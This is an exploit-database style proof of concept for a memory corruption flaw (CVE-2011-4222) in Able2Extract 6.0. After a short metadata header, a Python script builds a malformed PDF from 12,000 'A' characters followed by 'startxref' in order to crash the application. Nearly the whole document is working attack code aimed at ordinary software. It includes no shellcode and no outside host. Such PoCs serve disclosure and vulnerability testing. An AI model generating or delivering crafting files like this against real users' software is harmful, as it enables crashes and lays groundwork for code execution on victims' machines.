# Exploit Title: Able2Extract and Able2Extract Server v 6.0 Memory
Corruption
# Date: June 24 2012
# Exploit Author: Carlos Mario Penagos Hollmann
# Vendor Homepage: www.investintech.com
# Version:6.0
# Tested on: Windows 7
# CVE : cve-2011-4222


payload ="A"*12000
crash="startxref"
pdf=payload+crash

filename = "slimpdPoC.pdf"
file = open(filename,"w")
file.writelines(pdf)
file.close()